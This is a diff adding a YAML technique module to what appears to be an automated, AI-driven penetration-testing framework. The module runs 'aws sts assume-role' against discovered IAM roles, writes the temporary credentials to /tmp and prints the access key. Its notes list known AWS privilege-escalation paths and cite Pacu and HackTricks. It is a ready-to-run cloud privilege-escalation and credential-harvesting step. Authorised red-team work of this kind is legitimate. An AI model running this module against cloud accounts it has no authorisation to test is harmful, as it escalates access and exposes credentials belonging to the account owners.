@@ -1,0 +1,42 @@
+name: aws_sts_assume_role
+category: cloud
+description: Attempt to assume IAM roles via sts:AssumeRole for privilege escalation
+preconditions:
+- cloud.aws_creds_available
+- aws_roles_discovered
+parameters:
+  profile: from_finding.aws_profile
+  role_arn: from_finding.aws_role_arn
+command_template: >
+  aws sts assume-role --role-arn {role_arn}
+    --role-session-name tar-pentest --profile {profile} --output json 2>&1 |
+    tee /tmp/sts_assumed.json;
+  python3 -c "
+  import json, sys
+  try:
+      d = json.load(open('/tmp/sts_assumed.json'))
+      creds = d.get('Credentials', {})
+      if creds:
+          print(f'AccessKeyId: {creds[\"AccessKeyId\"]}')
+          print(f'Expiration: {creds[\"Expiration\"]}')
+          print('ROLE_ASSUMED_SUCCESSFULLY')
+  except: pass
+  "
+parser: generic_parser
+expected_effects:
+- aws_role_assumed
+- cloud_privilege_escalated
+- aws_creds_upgraded
+falsifier:
+  pattern: AccessDenied|is not authorized|does not exist
+  timeout: 20
+model_tier: haiku
+mechanism: >
+  STS AssumeRole grants temporary credentials for a target role if trust policy
+  allows the source principal. Enumerate cross-account trust policies (list-roles →
+  check AssumeRolePolicyDocument). Common privesc paths: iam:PassRole+ec2:RunInstances,
+  lambda:UpdateFunctionConfiguration+lambda:InvokeFunction, iam:CreatePolicyVersion,
+  iam:AttachUserPolicy. Use Pacu or enumerate manually via aws iam simulate-principal-policy.
+hacktricks_ref: cloud-security/aws-security/aws-privilege-escalation.md
+destructive: false
+opsec: medium
